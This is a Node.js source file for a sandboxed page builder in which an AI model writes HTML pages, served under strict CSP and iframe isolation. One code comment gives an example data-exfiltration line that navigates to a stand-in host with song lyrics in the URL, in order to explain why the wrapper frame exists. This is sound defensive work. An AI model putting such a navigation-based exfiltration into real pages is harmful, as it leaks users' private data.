/**
 * MY PAGES: a person's own small pages inside Studio, written by an AI model
 * they choose (any row on the Agent page: a cloud key, or LM Studio / Ollama
 * through "Custom server"). For a feature Studio does not have yet.
 *
 * Kept deliberately simple:
 *   - A page is one self-contained HTML file. Every save is a new version on
 *     disk, so a change the model gets wrong is one step back.
 *   - Stored in <app data>/pages/<id>/: page.json (name, dates, versions) and
 *     v<n>.html. A selected cloud writer receives the page, request and errors
 *     during generation; export is a file the person saves.
 *   - The page RUNS in the browser inside a sandboxed frame (web/pages.js):
 *     no access to Studio's routes, files or keys, and no internet. It gets a
 *     few read-only facts (songs, pictures) through a message bridge.
 *
 * Routes (every POST is same-origin JSON: generating spends the person's own
 * API tokens):
 *   GET  /api/pages                    list + the models that can write code
 *   GET  /api/pages/<id>[?v=n]         one page, its versions, that version's HTML
 *   POST /api/pages {action: create|save|rename|delete|generate|import, ...}
 */
import { readFile, writeFile, mkdir, readdir, rm } from "node:fs/promises";
import { randomBytes, createHash } from "node:crypto";
import path from "node:path";

const MAX_HTML = 2 * 1024 * 1024;          // one page, 2 MB of HTML
const MAX_NAME = 60;
const ID_RE = /^[a-f0-9]{12}$/;
/** A page still called this gets its name from the model's <title>. */
export const DEFAULT_NAME = "My page";

/** What a new page starts as: ideas to ask for, and a working example of the bridge. */
export const STARTER = `<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>My page</title>
<style>
  body { margin: 0; padding: 20px 20px 140px; font: 14px system-ui, sans-serif; background: #0d1017; color: #e8ecf3; }
  h1 { font-size: 20px; margin: 0 0 12px; }
  h2 { font-size: 13px; margin: 20px 0 6px; color: #9aa4b2; font-weight: 600; }
  ul { margin: 0; padding-left: 20px; }
  li { margin: 4px 0; }
  .ideas li { color: #c9d2de; }
</style>
</head>
<body>
<h1>My page</h1>
<p>Describe what this page should do in the box at the bottom, and the model will build it.</p>
<h2>Ideas to try</h2>
<ul class="ideas">
  <li>An equalizer for my songs, with a few presets</li>
  <li>A gallery of my pictures, with their prompts on hover</li>
  <li>My songs sorted by length, with a play button on each</li>
  <li>A waveform viewer that shows where the song is playing</li>
  <li>A shuffle player that picks a random song and shows its lyrics</li>
  <li>A metronome with tap tempo</li>
</ul>
<h2>Your latest songs</h2>
<ul id="songs"></ul>
<script>
  studio.songs().then((songs) => {
    document.getElementById("songs").innerHTML = songs.length ? songs.slice(0, 5)
      .map((s) => "<li>" + s.title.replace(/</g, "&lt;") + "</li>").join("") : "<li>No songs yet.</li>";
  });
</script>
</body>
</html>
`;

/** What the model is told, every time. Written from the failures seen with a
 *  strong model (2026-10-14): it reached for things the sandbox blocks
 *  (localStorage, a cross-origin <audio> into Web Audio, which plays silence)
 *  because nothing said they were blocked. So this says exactly what runs. */
export const SYSTEM_RULES = [
  "You build one small web page that runs inside AIPLAY Studio, a local AI music, picture and video app.",
  "",
  "OUTPUT",
  "- Reply with the COMPLETE page as ONE ```html code block, then nothing else.",
  "- Never a fragment, never \"the rest is unchanged\", never placeholder comments. The block replaces the page as a whole.",
  "- Keep every feature that already works unless the person asks to remove it.",
  "- Give the page a <title> of 2 to 4 words that says what it does (\"Song Equalizer\", not \"My page\").",
  "- Studio lays its request box over the bottom of the page: leave about 130px of empty space at the bottom.",
  "",
  "THE SANDBOX: hard limits, code that ignores them fails",
  "- The page runs in a sandboxed iframe with an opaque origin and this Content-Security-Policy:",
  "  default-src 'none'; script-src <Studio bootstrap hash> 'unsafe-eval'; style-src 'unsafe-inline';",
  "  img-src <studio> data: blob:; media-src <studio> data: blob:; font-src data:; connect-src 'none';",
  "  frame-src 'none'; worker-src 'none'; object-src 'none'; form-action 'none'",
  "- So there is NO: external script, stylesheet, font or CDN; ES module import; fetch, XMLHttpRequest, WebSocket or",
  "  EventSource; localStorage, sessionStorage, indexedDB or cookies (they THROW a SecurityError); alert, confirm or",
  "  prompt; window.open or popups; form submission; file downloads; navigation away. Use plain inline <script> tags.",
  "- Studio runs the page's classic inline scripts together after parsing, before DOMContentLoaded. JSON/data scripts",
  "  stay inert. Inline event handlers work, including handlers in later innerHTML. Do not use parser-time document.write,",
  "  ES modules, frames, workers or dynamically inserted <script> tags; use functions and addEventListener instead.",
  "- Audio may only start after a click inside the page: create or resume the AudioContext inside a click handler.",
  "",
  "THE STUDIO BRIDGE: window.studio exists before your scripts run. It is the only way to reach Studio.",
  "- studio.songs()  -> Promise<[{ file, title, caption, lyrics, durationSeconds, engine, createdAt }]>  the song library",
  "- studio.images() -> Promise<[{ name, prompt, width, height, createdAt }]>  the picture library",
  "- studio.audio(file) -> Promise<string>  a blob: URL of the song. Use THIS as the <audio> src whenever the sound goes",
  "  through Web Audio (equalizer, filters, analyser, visualiser, effects). The plain URL below is cross-origin, and",
  "  Web Audio turns a cross-origin element into SILENCE.",
  "- studio.audioData(file) -> Promise<ArrayBuffer>  the encoded file, for AudioContext.decodeAudioData (waveforms, analysis).",
  "- studio.audioUrl(file) -> string  for plain <audio> playback only, never into Web Audio.",
  "- studio.image(name) -> Promise<string>  a blob: URL of the picture, for <canvas> pixel work (getImageData).",
  "- studio.imageUrl(name) -> string  for a plain <img> only.",
  "- studio.get(key) -> Promise<any|null>, studio.set(key, value) -> Promise<void>  this page's own saved data",
  "  (JSON values, 1 MB in total). Use these instead of localStorage.",
  "Nothing else of Studio exists. Do not invent other calls.",
  "",
  "WORKING PATTERN: a song through Web Audio (an equalizer, for example)",
  "  let ctx, el, src;                                     // once, at the top",
  "  async function play(file) {                           // called from a click handler",
  "    ctx = ctx || new AudioContext();",
  "    if (!el) { el = new Audio(); src = ctx.createMediaElementSource(el); /* ONE source per element, ever */",
  "      src.connect(firstFilter); /* ...chain... */ lastNode.connect(ctx.destination); }   // no destination = no sound",
  "    el.src = await studio.audio(file);",
  "    await ctx.resume(); await el.play();",
  "  }",
  "  Peaking filters: BiquadFilterNode type 'peaking', gain in dB (about -12..+12), Q about 1.0, chained in series.",
  "",
  "STYLE",
  "- Dark theme: background #0d1017, panels #151a24, text #e8ecf3, muted #9aa4b2, accent #2bc4f2, system-ui font.",
  "- Clear and readable, works from 360px wide to full screen, real <button>/<label> elements, visible focus.",
  "- Keep it focused and under about 700 lines.",
  "",
  "BEFORE YOU ANSWER, CHECK",
  "- Every id you look up exists in the HTML; every function you call is defined; nothing is used before it is declared.",
  "- Every Promise is awaited or has .catch; errors are shown on the page in plain words.",
  "- Nothing from the NO list above is used anywhere.",
].join("\n");

export function buildPrompt({ html, request, name, errors = [] }) {
  const errs = (Array.isArray(errors) ? errors : []).map((e) => String(e).slice(0, 400)).filter(Boolean).slice(0, 8);
  return [
    SYSTEM_RULES,
    "",
    `PAGE NAME: ${name}`,
    "",
    "THE PAGE AS IT IS NOW:",
    "```html",
    html,
    "```",
    ...(errs.length ? ["", "THE PAGE AS IT IS NOW REPORTS THESE ERRORS (fix them as part of this change):", ...errs.map((e) => `- ${e}`)] : []),
    "",
    "WHAT THE PERSON WANTS:",
    request,
  ].join("\n");
}

/** The page's own <title>, cleaned, or "" when it has none. */
export function titleOf(html) {
  const m = /<title[^>]*>([\s\S]*?)<\/title>/i.exec(String(html || ""));
  return m ? cleanName(m[1].replace(/&amp;/g, "&").replace(/&[a-z#0-9]+;/gi, "").replace(/\s+/g, " ")) : "";
}

/** The HTML out of a model's answer: the last ```html block, else the reply if it is a document. */
export function extractHtml(text) {
  const s = String(text || "");
  const blocks = [...s.matchAll(/```(?:html|HTML)?\s*\n([\s\S]*?)```/g)].map((m) => m[1]);
  const pick = blocks.filter((b) => /<html|<body|<script|<div|<!doctype/i.test(b)).pop() || blocks.pop();
  if (pick && pick.trim()) return pick.trim() + "\n";
  if (/<!doctype html|<html[\s>]/i.test(s)) return s.slice(s.search(/<!doctype html|<html[\s>]/i)).trim() + "\n";
  return null;
}

/** A page file someone exported (web/pages.js): checked before it is kept. */
export function readExport(file) {
  const f = file && typeof file === "object" ? file : null;
  if (!f || f.format !== "aiplay-page") throw new Error("That is not an AIPLAY page file.");
  if (typeof f.html !== "string" || !f.html.trim()) throw new Error("The page file has no page in it.");
  if (f.html.length > MAX_HTML) throw new Error("The page in that file is larger than 2 MB.");
  return {
    name: cleanName(f.name) || "Imported page",
    html: f.html,
    author: typeof f.author === "string" ? f.author.slice(0, 80) : "",
    licence: f.licence === "Apache-2.0" ? "Apache-2.0" : null,
  };
}

/* Control characters, and the line separators and direction overrides that
 * could make a name in the list read as something else. */
const cleanName = (v) => String(v || "").replace(/[\u0000-\u001f<>\u200e\u200f\u2028\u2029\u202a-\u202e\u2066-\u2069]/g, "").trim().slice(0, MAX_NAME);

/* ── THE FRAME: how a page runs ─────────────────────────────────────────────
 *
 * A page is untrusted code (AI-written, or imported from a stranger). It is
 * served from GET /api/pages/<id>/frame and the parent loads it in an iframe
 * with sandbox="allow-scripts". The rules are RESPONSE HEADERS, not markup:
 * a <meta> policy spliced into the page's HTML was found (security probe,
 * 2026-10-14) to be defeatable by markup that moves the splice into a comment
 * or an attribute, or runs a script before it. A header cannot be moved:
 *   - `sandbox allow-scripts`: an opaque origin even if the address is opened
 *     straight in a tab, so the page never runs as Studio itself;
 *   - no network: connect-src, form-action and default-src 'none'; pictures
 *     and sound only from Studio itself and from data:/blob: URLs;
 *   - frame-ancestors 'self': no other website can frame it.
 * WebRTC is not covered by connect-src in current browsers. Only the exact
 * trusted bootstrap may execute as a script element. It removes the WebRTC
 * constructors before running the page's scripts in that sealed realm.
 * about:blank/srcdoc children can exist even with frame-src 'none', but their
 * inherited script policy blocks arbitrary scripts and event attributes.
 * Copying the allowed bootstrap into one seals that realm before any page
 * code runs there too. No secret nonce or one-window API deletion is relied on.
 * See CSP 3 sections 6.1.10 and 7.8, and HTML's sandboxed-origin flag. */
const ownOrigin = (host) => /^[\w.-]+(:\d+)?$|^\[[0-9a-f:]+\](:\d+)?$/i.test(String(host || "")) ? `http://${host}` : "";
export function frameCsp(host) {
  const own = ownOrigin(host) ? ` ${ownOrigin(host)}` : "";
  return `sandbox allow-scripts; default-src 'none'; script-src 'sha256-${BOOTSTRAP_HASH}' 'unsafe-eval'; script-src-attr 'none'; style-src 'unsafe-inline'; `
    + `img-src 'self'${own} data: blob:; media-src 'self'${own} data: blob:; font-src data:; `
    + `connect-src 'none'; frame-src 'none'; child-src 'none'; worker-src 'none'; object-src 'none'; `
    + `form-action 'none'; base-uri 'none'; frame-ancestors 'self'; webrtc 'block'`;
}
export const FRAME_HEADERS = {
  "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store",
  "X-Content-Type-Options": "nosniff", "Referrer-Policy": "no-referrer",
  "X-DNS-Prefetch-Control": "off",
  "Permissions-Policy": "camera=(), microphone=(), geolocation=(), display-capture=(), payment=(), usb=(), serial=()",
};

/* The bridge, as it runs INSIDE the frame. Every call is a message to the
 * parent (web/pages.js answers only its own frame); blobs are made here, so
 * they belong to the frame's origin and Web Audio and canvas can read them.
 * Answers arrive with Studio's own window (top) as their source, because
 * Studio's code posts them; the wrapper in between runs no script. The bridge
 * says hello until Studio answers, so nothing it sends early is lost. */
export const BRIDGE = `(()=>{
for(const k of ["RTCPeerConnection","webkitRTCPeerConnection","mozRTCPeerConnection","RTCDataChannel"]){try{delete window[k];Object.defineProperty(window,k,{value:undefined,writable:false,configurable:false});}catch{}if(window[k]!==undefined)throw new Error("This browser cannot isolate My pages.");}
let n=0,ready=false;const w=new Map(),q=[];
const raw=(m)=>parent.postMessage(m,"*");const send=(m)=>ready?raw(m):q.push(m);
const hi=()=>raw({aiplayBridge:1,op:"hello"});hi();const hello=setInterval(hi,100);
addEventListener("message",(e)=>{if(e.source!==parent&&e.source!==top)return;const d=e.data;if(!d||d.aiplayBridge!==1)return;
if(d.op==="ready"){if(!ready){ready=true;clearInterval(hello);q.splice(0).forEach(raw);}return;}
const p=w.get(d.id);if(!p)return;w.delete(d.id);d.error?p[1](new Error(d.error)):p[0](d.result);});
const ask=(op,args)=>new Promise((ok,no)=>{const id=++n;w.set(id,[ok,no]);send({aiplayBridge:1,id,op,args});});
const blobs=new Map();
const blobOf=(op,name)=>{const k=op+":"+name;if(!blobs.has(k))blobs.set(k,ask(op,{name}).then((r)=>URL.createObjectURL(new Blob([r.data],{type:r.type}))));return blobs.get(k);};
window.studio=Object.freeze({
songs:()=>ask("songs"),images:()=>ask("images"),
audio:(f)=>blobOf("audio",f),audioData:(f)=>ask("audio",{name:f}).then((r)=>r.data),
image:(f)=>blobOf("image",f),
audioUrl:(f)=>"/api/audio/"+encodeURIComponent(f),imageUrl:(f)=>"/api/image/"+encodeURIComponent(f),
get:(key)=>ask("data-get",{key}),set:(key,value)=>ask("data-set",{key,value})});
const say=(m)=>send({aiplayBridge:1,op:"error",message:String(m).slice(0,500)});
addEventListener("error",(e)=>say((e.message||"Error")+(e.lineno?" (line "+e.lineno+")":"")));
addEventListener("unhandledrejection",(e)=>say((e.reason&&e.reason.message)||e.reason));
const ce=console.error.bind(console);console.error=(...a)=>{say("console.error: "+a.map((x)=>x&&x.message||String(x)).join(" "));ce(...a);};
})();`;

/* THE WRAPPER around the frame. A sandboxed page may still navigate ITSELF,
 * and no CSP of its own stops that, so `location = "https://x/?" + lyrics`
 * would carry data out (measured: five ways, all went through). The browser
 * checks a frame's navigations against its PARENT's frame-src, so the page's
 * parent is this wrapper, whose policy allows only this page's frame URL.
 * Other Studio HTML must not become a fresh realm with a looser script policy.
 * It runs no script; the
 * screen (web/pages.js) listens on it for the page's bridge messages. */
export const SHELL_CSP = "default-src 'none'; style-src 'unsafe-inline'; frame-ancestors 'self'; base-uri 'none'; form-action 'none'";
export function shellCsp(host, id) {
  const own = ownOrigin(host);
  return `${SHELL_CSP}; frame-src ${own && ID_RE.test(id) ? `${own}/api/pages/${id}/frame` : "'none'"}`;
}
export const shellHtml = (id, version) => `<!doctype html><html><head><meta charset="utf-8"><style>`
  + `html,body{margin:0;height:100%;background:#0d1017}iframe{display:block;border:0;width:100%;height:100%}</style></head>`
  + `<body><iframe id="f" title="Your page" sandbox="allow-scripts" src="/api/pages/${encodeURIComponent(id)}/frame?v=${Number(version)}"></iframe></body></html>`;

/* No caller-controlled text goes in this script or its CSP hash. The browser
 * parses the page normally, with its own script elements/attributes blocked.
 * At interactive (before native DOMContentLoaded), run classic inline scripts
 * together in the already sealed realm. Keeping their lexical environment in
 * the handler factory lets an onclick use a top-level let/const as usual.
 * Parser-time document.write, modules and dynamically injected script elements
 * are deliberately unsupported. Data/JSON scripts stay in the DOM, inert. */
export const FRAME_BOOTSTRAP = `(()=>{
if(window.__aiplayPageBoot)return;Object.defineProperty(window,"__aiplayPageBoot",{value:true});
${BRIDGE}
const boot=document.currentScript;
const run=()=>{
  const classic=(s)=>!s.src&&!s.noModule&&(!s.type||/^(?:text|application)\\/(?:java|ecma)script(?:\\s*;|$)/i.test(s.type));
  const scripts=Array.from(document.scripts).filter(s=>s!==boot&&classic(s)).map(s=>s.textContent);
  let handler;try{handler=(0,eval)(scripts.join("\\n;\\n")+"\\n;((source)=>eval('(function(event){\\\\n'+source+'\\\\n})'))");}catch(e){console.error(e);}
  if(typeof handler!=="function")return;
  const bind=(root)=>{
    const nodes=root.nodeType===1?[root,...root.querySelectorAll("*")]:Array.from(root.querySelectorAll?.("*")||[]);
    for(const node of nodes)for(const attr of Array.from(node.attributes||[]))if(/^on[a-z]+$/i.test(attr.name)){
      const key=attr.name.toLowerCase(),source=attr.value;node.removeAttribute(attr.name);
      try{node[key]=handler(source);}catch(e){console.error(e);}
    }
  };
  bind(document);
  new MutationObserver(records=>{for(const record of records){if(record.type==="attributes")bind(record.target);else for(const node of record.addedNodes)bind(node);}}).observe(document,{childList:true,subtree:true,attributes:true});
};
if(document.readyState==="loading"){const ready=()=>{if(document.readyState!=="loading"){document.removeEventListener("readystatechange",ready);run();}};document.addEventListener("readystatechange",ready);}else run();
})();`;
const BOOTSTRAP_HASH = createHash("sha256").update(FRAME_BOOTSTRAP).digest("base64");

/** The trusted bootstrap precedes all generated markup. Its only allowed
 * script hash is inherited by local-scheme descendants as well. */
export const frameHtml = (html) => `<!doctype html><html><head><meta charset="utf-8"><script>${FRAME_BOOTSTRAP}</script><style>:root{color-scheme:dark}</style>\n${html}`;

/** "Qwen3 4B - writes lyrics and prompts" as a page writer: the size, and a
 *  warning under 8B, where pages come out with more mistakes. */
export function localLabel(row) {
  const name = String(row.label || row.file).replace(/ - writes lyrics and prompts$/, "");
  const size = Number((/(\d+(?:\.\d+)?)B\b/.exec(name) || [])[1]);
  return `${name} · Studio engine${size && size < 8 ? " · small, more mistakes" : ""}`;
}

export function createPages({ dir, cloud, local = null }) {
  const pageDir = (id) => {
    if (!ID_RE.test(String(id || ""))) throw Object.assign(new Error("No such page."), { status: 404 });
    return path.join(dir, id);
  };
  const readMeta = async (id) => {
    try { return JSON.parse(await readFile(path.join(pageDir(id), "page.json"), "utf8")); }
    catch (e) { if (e.status) throw e; throw Object.assign(new Error("No such page."), { status: 404 }); }
  };
  const writeMeta = (meta) => writeFile(path.join(pageDir(meta.id), "page.json"), JSON.stringify(meta, null, 2), "utf8");
  // Allocate versions and update metadata together. The model runs outside this
  // queue; only its final save waits for another mutation of the same page.
  const mutations = new Map();
  function mutate(id, action) {
    pageDir(id);
    const result = (mutations.get(id) || Promise.resolve()).then(action);
    const settled = result.then(() => {}, () => {});
    mutations.set(id, settled);
    settled.then(() => { if (mutations.get(id) === settled) mutations.delete(id); });
    return result;
  }

  async function addVersion(meta, html, { note = "", source = "hand" } = {}) {
    if (typeof html !== "string" || !html.trim()) throw new Error("The page is empty.");
    if (html.length > MAX_HTML) throw new Error("A page can be at most 2 MB of HTML.");
    const n = (meta.versions.at(-1)?.n || 0) + 1;
    await writeFile(path.join(pageDir(meta.id), `v${n}.html`), html, "utf8");
    meta.versions.push({ n, at: Date.now(), source, note: String(note || "").slice(0, 200) });
    meta.updated = Date.now();
    await writeMeta(meta);
    return n;
  }

  async function create({ name, html = STARTER, source = "hand", note = "", extra = {} } = {}) {
    const id = randomBytes(6).toString("hex");
    await mkdir(pageDir(id), { recursive: true });
    const meta = { id, name: cleanName(name) || DEFAULT_NAME, created: Date.now(), updated: Date.now(), versions: [], ...extra };
    await addVersion(meta, html, { source, note: note || "started" });
    return meta;
  }

  async function list() {
    let ids = [];
    try { ids = (await readdir(dir)).filter((d) => ID_RE.test(d)); } catch { /* none yet */ }
    const rows = [];
    for (const id of ids) {
      try { const m = await readMeta(id); rows.push({ id, name: m.name, updated: m.updated, versions: m.versions.length }); }
      catch { /* a broken folder is skipped, not fatal */ }
    }
    return rows.sort((a, b) => b.updated - a.updated);
  }

  async function get(id, v = null) {
    const meta = await readMeta(id);
    const n = v && meta.versions.some((x) => x.n === Number(v)) ? Number(v) : meta.versions.at(-1).n;
    const html = await readFile(path.join(pageDir(id), `v${n}.html`), "utf8");
    return { ...meta, version: n, html };
  }

  /** Ask the chosen model to build or change the page; the answer is a new version. */
  /* A page's own saved data (studio.get / studio.set): data.json beside its
   * versions, 1 MB in total, so a page never needs localStorage (blocked). */
  const MAX_DATA = 1024 * 1024;
  const dataFile = (id) => path.join(pageDir(id), "data.json");
  async function readData(id) {
    await readMeta(id);
    try { return JSON.parse(await readFile(dataFile(id), "utf8")) || {}; } catch { return {}; }
  }
  async function dataGet(id, key) {
    const d = await readData(id);
    return Object.hasOwn(d, String(key)) ? d[String(key)] : null;
  }
  async function dataSet(id, key, value) {
    const k = String(key || "");
    if (!k || k.length > 100) throw new Error("A saved-data key is 1 to 100 characters.");
    return mutate(id, async () => {
      const d = await readData(id);
      if (value === null || value === undefined) delete d[k]; else d[k] = value;
      const text = JSON.stringify(d);
      if (text.length > MAX_DATA) throw new Error("This page's saved data would pass 1 MB.");
      await writeFile(dataFile(id), text, "utf8");
    });
  }

  async function generate({ id, model, request, errors = [], onDelta = null }) {
    const ask = String(request || "").trim();
    if (!ask) throw new Error("Say what the page should do.");
    if (ask.length > 8000) throw new Error("Keep the request under 8000 characters.");
    /* "local:<file>" is one of the engine's own models; anything else an API row. */
    const localFile = /^local:(.+)$/.exec(String(model || ""))?.[1] || null;
    if (localFile && !local) throw new Error("Local models are not available here.");
    const choice = localFile ? { provider: "engine", model: localFile } : await cloud.resolveChoice(model);
    if (!choice) throw new Error("That model is not connected. Pick one connected on the Agent page.");
    if (localFile) {
      const why = await local.busy();
      if (why) throw new Error(`${why} A local model needs the card: try again when it is free.`);
    }
    const cur = await get(id);
    const prompt = buildPrompt({ html: cur.html, request: ask, name: cur.name, errors });
    let text;
    if (localFile) {
      onDelta?.({ kind: "note", text: "The Studio engine writes the whole page in one go, so it shows when it is done." });
      text = await local.complete(localFile, prompt);
    } else {
      try {
        text = await cloud.complete(choice, prompt, { maxTokens: 16000, timeoutMs: 300_000, onDelta, think: !!onDelta });
      } catch (e) {
        /* Some models cap output below 16k and say so with a 400: once more, smaller. */
        if (e?.status !== 400) throw e;
        text = await cloud.complete(choice, prompt, { maxTokens: 8000, timeoutMs: 300_000, onDelta, think: !!onDelta });
      }
    }
    const html = extractHtml(text);
    if (!html) throw new Error("The model answered without a page. Try again, or describe the change differently.");
    return mutate(id, async () => {
      const meta = await readMeta(id);
      /* A page still on the default name takes the name the model gave it. */
      const title = titleOf(html);
      if (meta.name === DEFAULT_NAME && title && title !== DEFAULT_NAME) meta.name = title;
      const n = await addVersion(meta, html, { source: `ai:${choice.provider}/${choice.model}`, note: ask.slice(0, 200) });
      return { version: n, html, name: meta.name };
    });
  }

  async function handle(req, res, url, { json, readBody, sameOriginLocalJson }) {
    const p = url.pathname;
    if (p !== "/api/pages" && !p.startsWith("/api/pages/")) return false;
    try {
      if (req.method === "GET") {
        if (p === "/api/pages") {
          const models = await cloud.choices().catch(() => []);
          /* null = the engine is not running, so its models cannot be listed. */
          const engine = local ? await local.models().catch(() => null) : [];
          json(res, 200, {
            pages: await list(),
            models: [
              ...models.map((m) => ({ value: m.file, label: m.label, group: "api" })),
              ...(engine || []).filter((m) => !/^api:/.test(m.file)).map((m) => ({ value: `local:${m.file}`, label: localLabel(m), group: "local" })),
            ],
            engineOff: !!local && engine === null,
          });
        } else if (/^\/api\/pages\/[^/]+\/(frame|shell)$/.test(p)) {
          const shell = p.endsWith("/shell");
          const page = await get(decodeURIComponent(p.slice("/api/pages/".length, p.lastIndexOf("/"))), url.searchParams.get("v"));
          if (shell) {
            /* The wrapper Studio's screen loads: no script, and frame-src 'self',
             * which the browser checks on EVERY navigation of the page inside
             * it, so the page cannot carry data off by navigating itself. */
            res.writeHead(200, { ...FRAME_HEADERS, "Content-Security-Policy": shellCsp(req.headers.host, page.id) });
            res.end(shellHtml(page.id, page.version));
          } else {
            /* A top-level visit needs the wrapper too: only its parent policy
             * can constrain the generated document's own navigations. Missing
             * Fetch Metadata also takes this safe entry point. */
            if (!["iframe", "frame"].includes(req.headers["sec-fetch-dest"])) {
              res.writeHead(302, { ...FRAME_HEADERS, Location: `/api/pages/${page.id}/shell?v=${page.version}` });
              res.end(); return true;
            }
            /* The page itself: the policy is a response header its markup cannot move. */
            res.writeHead(200, { ...FRAME_HEADERS, "Content-Security-Policy": frameCsp(req.headers.host) });
            res.end(frameHtml(page.html));
          }
        } else {
          json(res, 200, await get(decodeURIComponent(p.slice("/api/pages/".length)), url.searchParams.get("v")));
        }
        return true;
      }
      if (req.method !== "POST" || p !== "/api/pages") { json(res, 405, { error: "Not allowed." }); return true; }
      if (!sameOriginLocalJson(req)) { json(res, 403, { error: "Only Studio's own page can change pages." }); return true; }
      const b = await readBody(req, MAX_HTML * 2 + 64 * 1024);
      switch (b.action) {
        case "create": json(res, 200, await create({ name: b.name })); return true;
        case "save": {
          const n = await mutate(b.id, async () => addVersion(await readMeta(b.id), b.html, { note: b.note || "edited by hand" }));
          json(res, 200, { version: n }); return true;
        }
        case "rename": {
          const name = await mutate(b.id, async () => {
            const meta = await readMeta(b.id);
            meta.name = cleanName(b.name) || meta.name;
            await writeMeta(meta);
            return meta.name;
          });
          json(res, 200, { name }); return true;
        }
        case "delete":
          await mutate(b.id, () => rm(pageDir(b.id), { recursive: true, force: true }));
          json(res, 200, { ok: true }); return true;
        case "generate": {
          if (!b.stream) { json(res, 200, await generate(b)); return true; }
          /* Streamed: one JSON line per piece the model writes (its thinking,
           * the page), then the saved version, so the page can be watched. */
          res.writeHead(200, { "Content-Type": "application/x-ndjson; charset=utf-8", "Cache-Control": "no-store", "X-Content-Type-Options": "nosniff" });
          const line = (o) => { try { res.write(JSON.stringify(o) + "\n"); } catch { /* the page went away */ } };
          try {
            const r = await generate({ ...b, onDelta: (d) => line({ type: d.kind, text: d.text }) });
            line({ type: "done", ...r });
          } catch (e) { line({ type: "error", error: String(e?.message || e) }); }
          res.end();
          return true;
        }
        case "data-get": json(res, 200, { value: await dataGet(b.id, b.key) }); return true;
        case "data-set": await dataSet(b.id, b.key, b.value); json(res, 200, { ok: true }); return true;        case "import": {
          const f = readExport(b.file);
          const meta = await create({ name: f.name, html: f.html, source: "import",
            note: f.author ? `imported, by ${f.author}` : "imported", extra: { author: f.author, licence: f.licence } });
          json(res, 200, meta); return true;
        }
        default: json(res, 400, { error: "Unknown action." }); return true;
      }
    } catch (e) {
      json(res, e?.status && e.status < 500 ? e.status : 400, { error: String(e?.message || e) });
      return true;
    }
  }

  return { list, get, create, generate, dataGet, dataSet, handle };
}
